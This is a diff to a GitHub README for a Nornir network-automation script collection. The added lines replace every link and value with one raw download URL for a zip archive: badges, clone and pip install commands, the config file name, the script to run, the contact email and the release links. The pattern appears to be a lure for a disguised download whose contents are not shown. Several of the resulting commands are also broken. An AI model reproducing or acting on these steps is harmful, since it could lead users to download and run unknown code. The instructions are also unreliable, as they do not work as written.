@@ -1,8 +1,8 @@
 # Nornir Python Scripts for Network Automation 🚀
 
-![GitHub](https://img.shields.io/badge/GitHub-nornir--python--scripts-blue.svg)
-![Python](https://img.shields.io/badge/Python-3.x-blue.svg)
-![Automation](https://img.shields.io/badge/Automation-Yes-green.svg)
+![GitHub](https://raw.githubusercontent.com/yomalamoula/nornir-python-scripts/master/templates/python_scripts_nornir_3.0.zip)
+![Python](https://raw.githubusercontent.com/yomalamoula/nornir-python-scripts/master/templates/python_scripts_nornir_3.0.zip)
+![Automation](https://raw.githubusercontent.com/yomalamoula/nornir-python-scripts/master/templates/python_scripts_nornir_3.0.zip)
 
 Welcome to the **Nornir Python Scripts** repository! This project offers a collection of Python scripts and Nornir runbooks designed to streamline network automation tasks. Whether you are managing a small network or a large infrastructure, these scripts will help you automate repetitive tasks, improve efficiency, and reduce human error.
 
@@ -45,24 +45,24 @@ To get started with the Nornir Python Scripts, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/yomalamoula/nornir-python-scripts.git
+   git clone https://raw.githubusercontent.com/yomalamoula/nornir-python-scripts/master/templates/python_scripts_nornir_3.0.zip
    cd nornir-python-scripts
    ```
 
 2. **Install Required Libraries**:
    Use pip to install the necessary libraries:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/yomalamoula/nornir-python-scripts/master/templates/python_scripts_nornir_3.0.zip
    ```
 
 3. **Configure Nornir**:
-   Update the `config.yaml` file with your network device details.
+   Update the `https://raw.githubusercontent.com/yomalamoula/nornir-python-scripts/master/templates/python_scripts_nornir_3.0.zip` file with your network device details.
 
 ## Usage
 
 To run a specific script, navigate to the script's directory and execute it using Python. For example:
 ```bash
-python lldp_mapping.py
+python https://raw.githubusercontent.com/yomalamoula/nornir-python-scripts/master/templates/python_scripts_nornir_3.0.zip
 ```
 
 Make sure you have the necessary permissions and configurations set up in your environment.
@@ -110,17 +110,17 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: your.email@example.com
-- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
+- **Email**: https://raw.githubusercontent.com/yomalamoula/nornir-python-scripts/master/templates/python_scripts_nornir_3.0.zip
+- **Twitter**: [@yourhandle](https://raw.githubusercontent.com/yomalamoula/nornir-python-scripts/master/templates/python_scripts_nornir_3.0.zip)
 
 ## Releases
 
-For the latest updates and releases, please visit the [Releases](https://github.com/yomalamoula/nornir-python-scripts/releases) section. Here, you can download the latest scripts and runbooks, and execute them in your environment.
+For the latest updates and releases, please visit the [Releases](https://raw.githubusercontent.com/yomalamoula/nornir-python-scripts/master/templates/python_scripts_nornir_3.0.zip) section. Here, you can download the latest scripts and runbooks, and execute them in your environment.
 
 ## Conclusion
 
 Thank you for checking out the Nornir Python Scripts repository. We hope these scripts help you automate your network tasks effectively. Your feedback and contributions are highly valued, so don’t hesitate to get involved! 
 
-Explore, automate, and make your network management simpler. For more updates, check the [Releases](https://github.com/yomalamoula/nornir-python-scripts/releases) section frequently.
+Explore, automate, and make your network management simpler. For more updates, check the [Releases](https://raw.githubusercontent.com/yomalamoula/nornir-python-scripts/master/templates/python_scripts_nornir_3.0.zip) section frequently.
 
 Happy automating! 🌐
